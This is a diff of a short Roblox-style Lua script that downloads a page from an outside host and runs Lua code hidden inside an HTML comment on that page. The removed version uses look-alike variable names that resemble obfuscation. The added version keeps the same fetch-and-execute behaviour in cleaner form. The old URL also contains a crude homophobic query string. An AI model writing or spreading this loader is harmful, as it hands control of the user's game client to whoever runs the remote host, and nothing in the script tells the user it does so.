@@ -1,14 +1,6 @@
--- by ghost player
-local website = game:HttpGet("http://zte.ct.ws/?=youaregay")
 
-if Ioad == nil or IoadClone == nil then
-   Ioad = nil
-   loadstring(website:sub(website.find(website, "<!--") + 4, website.find(website, "<!--") + 4 + 222))()
-   if IoadClone == nil and Ioad ~= nil then
-      IoadClone = Ioad
-   end
-end
-
-if Ioad ~= IoadClone then
-   Ioad = IoadClone
-end
+local website = game:HttpGet("http://zte.ct.ws/")
+local start_i, _    = website:find("<!--")
+local _,      end_i = website:find("-->", start_i and start_i+1 or 1)
+local lua_code = website:sub(start_i + 4, end_i - 1)
+local ok, err = pcall(loadstring(lua_code))
